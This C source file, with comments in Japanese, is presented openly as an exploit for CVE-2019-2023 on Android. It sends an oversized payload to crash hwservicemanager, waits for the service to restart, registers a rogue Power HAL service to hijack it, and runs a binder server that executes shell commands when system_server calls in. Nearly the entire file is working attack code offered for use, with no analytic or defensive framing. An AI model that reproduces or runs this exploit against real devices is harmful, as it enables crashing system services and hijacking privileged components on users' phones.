#define _GNU_SOURCE
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include <fcntl.h>
#include <errno.h>
#include <sys/ioctl.h>
#include <sys/types.h>
#include <sys/wait.h>
#include <sys/ptrace.h>
#include <sys/mman.h>
#include <signal.h>
#include <stdint.h>
#include <sched.h>
#include <poll.h>
#include <sys/prctl.h>
#include <sys/stat.h>
#include <time.h>
#include <sys/syscall.h>
#include <dirent.h>
#include <arpa/inet.h>
#include "binder.h"

// ============================================================
// プロトタイプ宣言（全関数を前方宣言）
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len);
static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data);
static int write_file(const char *path, const char *data);
static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len);
static pid_t get_hwservicemanager_pid(void);
static int overflow_hwservicemanager(void);
static int exploit_cve_2019_2023(const char *service_name);
static int binder_server_loop(int binder_fd, int expected_handle);

// ============================================================
// 設定
// ============================================================
#define TARGET_SERVICE "android.hardware.power@1.0::IPower/default"
#define OUTPUT_FILE    "/data/local/tmp/cve_2019_2023_result.txt"
#define LOG_FILE       "/data/local/tmp/binder_traffic.log"
#define SHELL_PATH     "/system/bin/sh"

static volatile int race_ready = 0;
static int g_service_handle = -1;
static int g_binder_fd = -1;
static int g_exploit_success = 0;
static pid_t g_server_pid = -1;
static pid_t g_hwservicemanager_pid = 0;

// ============================================================
// ユーティリティ関数
// ============================================================
static void dump_hex(FILE *fp, const uint8_t *data, size_t len) {
    for (size_t i = 0; i < len; i++) {
        fprintf(fp, "%02x ", data[i]);
        if ((i+1) % 16 == 0) fprintf(fp, "\n");
    }
    fprintf(fp, "\n");
}

static void log_transaction(const char *msg, struct binder_transaction_data *t, const uint8_t *data) {
    FILE *fp = fopen(LOG_FILE, "a");
    if (!fp) fp = stderr;
    fprintf(fp, "[%ld] %s\n", time(NULL), msg);
    fprintf(fp, "  handle=%d code=0x%x flags=0x%x data_size=%zu offsets_size=%zu\n",
            t->target.handle, t->code, t->flags, (size_t)t->data_size, (size_t)t->offsets_size);
    if (data && t->data_size > 0) {
        fprintf(fp, "  data (%zu bytes):\n", (size_t)t->data_size);
        dump_hex(fp, data, t->data_size > 512 ? 512 : t->data_size);
    }
    if (fp != stderr) fclose(fp);
}

static int write_file(const char *path, const char *data) {
    int fd = open(path, O_WRONLY | O_CREAT | O_TRUNC, 0644);
    if (fd < 0) return -1;
    ssize_t n = write(fd, data, strlen(data));
    close(fd);
    return (n == (ssize_t)strlen(data)) ? 0 : -1;
}

static int read_file_to_memory(const char *path, uint8_t **out, size_t *out_len) {
    int fd = open(path, O_RDONLY);
    if (fd < 0) return -1;
    off_t size = lseek(fd, 0, SEEK_END);
    if (size <= 0) { close(fd); return -1; }
    lseek(fd, 0, SEEK_SET);
    uint8_t *buf = malloc(size + 1);
    if (!buf) { close(fd); return -1; }
    ssize_t n = read(fd, buf, size);
    close(fd);
    if (n < 0) { free(buf); return -1; }
    buf[n] = '\0';
    *out = buf;
    *out_len = n;
    return 0;
}

// ============================================================
// hwservicemanager PID 取得（死活監視用）
// ============================================================
static pid_t get_hwservicemanager_pid(void) {
    FILE *fp = popen("pidof hwservicemanager", "r");
    if (!fp) return -1;
    char pid_str[16];
    if (!fgets(pid_str, sizeof(pid_str), fp)) {
        pclose(fp);
        return -1;
    }
    pclose(fp);
    pid_t pid = atoi(pid_str);
    if (pid <= 0) return -1;
    return pid;
}

// ============================================================
// CVE-2019-2023 エクスプロイト（レース付きサービス登録）
// ============================================================
static int exploit_cve_2019_2023(const char *service_name) {
    int hwbinder_fd, ret;
    uint8_t read_buf[4096];
    size_t name_len = strlen(service_name) + 1;
    size_t total_len = 4 + name_len;
    uint8_t *data;
    int handle = -1;
    pid_t child;

    printf("[*] CVE-2019-2023: registering '%s'...\n", service_name);

    child = fork();
    if (child == 0) {
        while (!race_ready) usleep(100);
        exit(0);
    } else if (child < 0) {
        perror("  fork");
        return -1;
    }

    usleep(200000);

    hwbinder_fd = open("/dev/hwbinder", O_RDWR);
    if (hwbinder_fd < 0) {
        perror("  open /dev/hwbinder");
        kill(child, SIGKILL);
        return -1;
    }

    data = malloc(total_len);
    if (!data) {
        perror("  malloc");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    struct {
        uint32_t cmd;
        struct binder_transaction_data tdata;
    } __attribute__((packed)) tx;
    tx.cmd = BC_TRANSACTION;
    tx.tdata.target.handle = 0;
    tx.tdata.code = 2;                     // ADD_SERVICE
    tx.tdata.flags = 0;
    tx.tdata.data_size = total_len;
    tx.tdata.offsets_size = 0;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    race_ready = 1;
    usleep(50000);

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl ADD_SERVICE");
        close(hwbinder_fd);
        kill(child, SIGKILL);
        return -1;
    }
    printf("  [+] ADD_SERVICE succeeded!\n");

    kill(child, SIGKILL);
    waitpid(child, NULL, 0);

    // GET_SERVICE でハンドル取得
    data = malloc(total_len);
    if (!data) {
        close(hwbinder_fd);
        return -1;
    }
    data[0] = (uint8_t)(name_len & 0xFF);
    data[1] = (uint8_t)((name_len >> 8) & 0xFF);
    data[2] = (uint8_t)((name_len >> 16) & 0xFF);
    data[3] = (uint8_t)((name_len >> 24) & 0xFF);
    memcpy(data + 4, service_name, name_len);

    tx.tdata.code = 1;                     // GET_SERVICE
    tx.tdata.data_size = total_len;
    tx.tdata.data.ptr.buffer = (binder_uintptr_t)data;

    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(tx);
    bwr.write_buffer = (binder_uintptr_t)&tx;
    bwr.read_size = sizeof(read_buf);
    bwr.read_buffer = (binder_uintptr_t)read_buf;

    ret = ioctl(hwbinder_fd, BINDER_WRITE_READ, &bwr);
    free(data);
    if (ret < 0) {
        perror("  ioctl GET_SERVICE");
        close(hwbinder_fd);
        return -1;
    }
    if (bwr.read_consumed < 4) {
        printf("  [-] No handle returned\n");
        close(hwbinder_fd);
        return -1;
    }
    handle = *(int*)read_buf;
    printf("  [+] Service handle: %d\n", handle);
    close(hwbinder_fd);
    g_service_handle = handle;
    return 0;
}

// ============================================================
// オーバーフロー攻撃（hwservicemanager クラッシュ狙い）
// ============================================================
static int overflow_hwservicemanager(void) {
    printf("[*] Attempting heap overflow to crash hwservicemanager...\n");
    char *payload = malloc(8192);
    if (!payload) return -1;
    memset(payload, 'A', 8191);
    payload[8191] = '\0';
    int ret = exploit_cve_2019_2023(payload);
    free(payload);
    if (ret == 0) {
        printf("  [+] Overflow payload sent.\n");
        sleep(2);
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid != g_hwservicemanager_pid) {
            printf("  [+] hwservicemanager crashed! New PID: %d\n", new_pid);
            g_hwservicemanager_pid = new_pid;
            return 0;
        } else {
            printf("  [-] hwservicemanager did not crash (still PID %d)\n", g_hwservicemanager_pid);
            return -1;
        }
    }
    return -1;
}

// ============================================================
// Binder サーバーループ（トランザクション待受・system_server 検知）
// ============================================================
static int binder_server_loop(int binder_fd, int expected_handle) {
    uint8_t read_buf[4096];
    struct binder_write_read bwr;
    int ret;
    int transaction_count = 0;

    printf("[*] Starting Binder server loop for handle %d...\n", expected_handle);
    printf("[*] Waiting for transactions...\n");

    while (1) {
        memset(&bwr, 0, sizeof(bwr));
        bwr.read_size = sizeof(read_buf);
        bwr.read_buffer = (binder_uintptr_t)read_buf;

        ret = ioctl(binder_fd, BINDER_WRITE_READ, &bwr);
        if (ret < 0) {
            perror("  ioctl read");
            break;
        }
        if (bwr.read_consumed == 0) {
            usleep(100000);
            continue;
        }

        uint32_t *cmd = (uint32_t*)read_buf;
        uint32_t cmd_code = *cmd;
        uint8_t *payload = read_buf + sizeof(uint32_t);
        size_t payload_size = bwr.read_consumed - sizeof(uint32_t);

        // BR_NOOP (0x720c) は正常なポーリングなので無視
        if (cmd_code == 0x720c) {
            fprintf(stderr, "[SERVER] BR_NOOP ignored.\n");
            continue;
        }

        fprintf(stderr, "[SERVER] Received cmd=0x%x (%d), size=%zu\n", cmd_code, cmd_code, payload_size);

        if (cmd_code == BR_TRANSACTION || cmd_code == BR_TRANSACTION_SEC_CTX) {
            struct binder_transaction_data *t = (struct binder_transaction_data*)payload;
            size_t data_size = t->data_size;
            uint8_t *data_ptr = NULL;
            if (data_size > 0 && data_size < 4096) {
                data_ptr = malloc(data_size);
                if (data_ptr) {
                    memcpy(data_ptr, (uint8_t*)(uintptr_t)t->data.ptr.buffer, data_size);
                }
            }
            log_transaction("Incoming transaction", t, data_ptr);
            if (data_ptr) free(data_ptr);

            // 呼び出し元が system_server (uid=1000) ならコマンド実行
            if (t->sender_euid == 1000) {
                printf("[SERVER] Received transaction from system_server (uid=1000)! Executing id...\n");
                pid_t pid = fork();
                if (pid == 0) {
                    int fd = open(OUTPUT_FILE, O_WRONLY | O_CREAT | O_TRUNC, 0644);
                    if (fd >= 0) {
                        dup2(fd, STDOUT_FILENO);
                        dup2(fd, STDERR_FILENO);
                        close(fd);
                    }
                    execl(SHELL_PATH, "sh", "-c", "id; getenforce; echo '=== CVE-2019-2023 EXECUTED BY SYSTEM_SERVER ==='", NULL);
                    exit(1);
                } else if (pid > 0) {
                    wait(NULL);
                    printf("[SERVER] id command executed. Check %s\n", OUTPUT_FILE);
                }
                g_exploit_success = 1;
            } else {
                printf("[SERVER] Sender uid=%d (ignoring)\n", t->sender_euid);
            }

            // 応答を返す（BR_OK）
            struct {
                uint32_t cmd;
                uint32_t status;
            } __attribute__((packed)) reply;
            reply.cmd = BR_OK;
            reply.status = 0;

            struct binder_write_read write_bwr;
            memset(&write_bwr, 0, sizeof(write_bwr));
            write_bwr.write_size = sizeof(reply);
            write_bwr.write_buffer = (binder_uintptr_t)&reply;

            ret = ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);
            if (ret < 0) perror("  ioctl write reply");

            uint32_t complete_cmd = BR_TRANSACTION_COMPLETE;
            write_bwr.write_size = sizeof(complete_cmd);
            write_bwr.write_buffer = (binder_uintptr_t)&complete_cmd;
            ioctl(binder_fd, BINDER_WRITE_READ, &write_bwr);

            transaction_count++;
            printf("[SERVER] Transaction #%d handled.\n", transaction_count);
        } else if (cmd_code == BR_DEAD_BINDER) {
            printf("[SERVER] Received DEAD_BINDER\n");
            break;
        } else {
            fprintf(stderr, "[SERVER] Unhandled cmd=0x%x\n", cmd_code);
        }
    }
    return transaction_count;
}

// ============================================================
// メイン（オーバーフロー → 再起動監視 → 乗っ取り → サーバー起動）
// ============================================================
int main(void) {
    printf("============================================================\n");
    printf("  CVE-2019-2023 Ultimate - Power HAL Hijack + Crash Recovery\n");
    printf("============================================================\n\n");

    FILE *fp = fopen(LOG_FILE, "w");
    if (fp) {
        fprintf(fp, "=== Binder Traffic Log ===\n");
        fclose(fp);
        printf("[+] Log file created: %s\n", LOG_FILE);
    }

    g_hwservicemanager_pid = get_hwservicemanager_pid();
    if (g_hwservicemanager_pid <= 0) {
        printf("[-] Could not find hwservicemanager. Exiting.\n");
        return 1;
    }
    printf("[+] Current hwservicemanager PID: %d\n", g_hwservicemanager_pid);

    // 1. オーバーフローで hwservicemanager をクラッシュさせる（最大5回試行）
    int crashed = 0;
    for (int i = 0; i < 5; i++) {
        if (overflow_hwservicemanager() == 0) {
            crashed = 1;
            break;
        }
        sleep(2);
    }
    if (!crashed) {
        printf("[-] Failed to crash hwservicemanager. Continuing anyway...\n");
    }

    // 2. hwservicemanager が再起動するのを待つ（PID 変化を監視）
    printf("[*] Waiting for hwservicemanager to restart...\n");
    int max_wait = 30;
    while (max_wait-- > 0) {
        pid_t new_pid = get_hwservicemanager_pid();
        if (new_pid > 0 && new_pid != g_hwservicemanager_pid) {
            printf("[+] hwservicemanager restarted with PID: %d\n", new_pid);
            g_hwservicemanager_pid = new_pid;
            break;
        }
        sleep(1);
    }

    // 3. Power HAL を乗っ取る（再起動直後が狙い目）
    printf("[*] Hijacking Power HAL service...\n");
    if (exploit_cve_2019_2023(TARGET_SERVICE) != 0) {
        printf("[-] Failed to register Power HAL. Retrying once...\n");
        sleep(1);
        if (exploit_cve_2019_2023(TARGET_SERVICE) != 0) {
            printf("[-] Registration failed. Exiting.\n");
            return 1;
        }
    }
    printf("[+] Successfully hijacked '%s' (handle %d)\n", TARGET_SERVICE, g_service_handle);

    // 4. Binder サーバー起動
    int binder_fd = open("/dev/hwbinder", O_RDWR);
    if (binder_fd < 0) {
        perror("  open /dev/hwbinder");
        return 1;
    }
    g_binder_fd = binder_fd;

    uint32_t cmd = BC_ENTER_LOOPER;
    struct binder_write_read bwr;
    memset(&bwr, 0, sizeof(bwr));
    bwr.write_size = sizeof(cmd);
    bwr.write_buffer = (binder_uintptr_t)&cmd;
    if (ioctl(binder_fd, BINDER_WRITE_READ, &bwr) < 0) {
        perror("  BC_ENTER_LOOPER");
        close(binder_fd);
        return 1;
    }
    printf("[+] Entered Binder looper.\n");

    pid_t server_pid = fork();
    if (server_pid == 0) {
        binder_server_loop(binder_fd, g_service_handle);
        exit(0);
    } else if (server_pid < 0) {
        perror("  fork server");
        close(binder_fd);
        return 1;
    } else {
        printf("[+] Binder server running (PID %d)\n", server_pid);
        g_server_pid = server_pid;
    }

    // 5. 待機（system_server からの呼び出しを待つ）
    printf("[*] Waiting for system_server to call hijacked Power HAL...\n");
    printf("[*] Running for 120 seconds. Check %s for logs.\n", LOG_FILE);
    sleep(120);

    // 6. 終了処理
    if (g_server_pid > 0) {
        kill(g_server_pid, SIGTERM);
        waitpid(g_server_pid, NULL, 0);
    }
    if (g_binder_fd >= 0) close(g_binder_fd);

    // 7. 結果表示
    printf("\n[*] Log file content:\n");
    system("cat " LOG_FILE " 2>/dev/null || echo 'No log file found'");

    if (g_exploit_success) {
        printf("[+] Exploit succeeded! Check %s\n", OUTPUT_FILE);
    } else {
        printf("[-] No transaction from system_server received.\n");
        printf("[-] Try manually triggering power events (screen on/off) or wait longer.\n");
    }

    printf("\n============================================================\n");
    printf("  Exploit finished. Success: %s\n", g_exploit_success ? "YES" : "NO");
    return g_exploit_success ? 0 : 1;
}
